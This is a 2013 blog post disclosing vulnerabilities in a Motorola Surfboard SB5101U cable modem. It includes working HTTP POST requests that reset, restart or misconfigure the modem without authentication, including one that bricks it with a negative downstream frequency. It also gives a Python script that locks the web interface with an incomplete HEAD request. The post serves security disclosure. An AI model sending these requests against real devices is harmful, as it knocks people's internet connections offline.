---
categories:
- modem
- motorola
- dos
comments: false
date: "2013-04-20T23:06:45Z"
title: Motorola Surfboard - Multiple Vulnerabilities
---

It would appear that these vulnerabilities were disclosed a few years ago ([CVE-2008-2002](http://www.cvedetails.com/cve/CVE-2008-2002/) and [CVE-2006-5196](http://www.cvedetails.com/cve/CVE-2006-5196/)), but my relatively new (1-2 years) Motorola Surfboard SB5101U (verified against both the 101 and 101U), loaded with SB5101NU-2.1.7.0-GA-00-388-NOSH, appears to be vulnerable to the same CSRF's exposed prior.  With no authentication system in place at all, it would appear that a local DoS is not much of a concern to them.  It's interesting that, despite the sudden flood of discovered vulnerabilities in routers, nobody is really taking a look at the other piece of hardware between you and the ISP.  As I poked about this modem, I discovered a few other interesting things.

First, here's the POST to reset the modem to factory defaults:

```
POST /goform/RgConfig HTTP/1.1
Host: 192.168.100.1
Proxy-Connection: keep-alive
Content-Length: 34
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Origin: http://192.168.100.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.100.1/RgConfig.asp
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3

RestoreFactoryDefault=1&ResetReq=0
```

And the POST for restarting the modem:

```
POST /goform/RgConfig HTTP/1.1
Host: 192.168.100.1
Proxy-Connection: keep-alive
Content-Length: 34
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Origin: http://192.168.100.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.100.1/RgConfig.asp
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3

RestoreFactoryDefault=0&ResetReq=1
```

This page also appears to allow the user the ability to modify modem settings by intercepting the response and modifying a javascript flag:

{{< figure class="center" src="http://3.bp.blogspot.com/-SJ6LsHU8-28/UVeuZzI105I/AAAAAAAAAcM/5T3qv2jygZI/s640/config_mod.jpg" >}}

Once we flip the flag var from 1 to 0, we have write access via the web interface.  The write POST is as follows:

```
POST /goform/RgConfig HTTP/1.1
Host: 192.168.100.1
Proxy-Connection: keep-alive
Content-Length: 125
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Origin: http://192.168.100.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.100.1/RgConfig.asp
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3

CmFrequencyPlan=0&CmUpChannelId=1&CmDownstreamFreq=843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0
```

With this we can totally brick the device (that is, until someone figures all this out) by modifying the stream frequency as follows:

```
CmFrequencyPlan=0&CmUpChannelId=0&CmDownstreamFreq=-843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0
```

This can be fixed by simply restoring the configuration to the factory default through the web interface.  However: with an incomplete HTTP HEAD request, we can completely DoS the web server rendering any attempt to access it from the local network moot.  The code:

```
import socket

request = 'HEAD / HTTP/1.1\r\n'\
          'Connection: Keep-Alive\r\n'\
          'Content-Length: 50\r\n'\
          'Host: 192.168.100.1\r\n\r\n'
try:
    sock = socket.socket()
    sock.connect(('192.168.100.1', 80))
    sock.send(request)
    print 'Holding the flag...'
    data = sock.recv(1024)
except Exception, e: print e
except KeyboardInterrupt: sock.close()
```

Because the web server does not have the entire request, it waits for it in another packet.  Which, of course, never arrives.  We can test this by removing the Content-Length field, which will automatically then close the socket.  Between these two vulnerabilities, the modem is essentially rendered useless until hard booted.
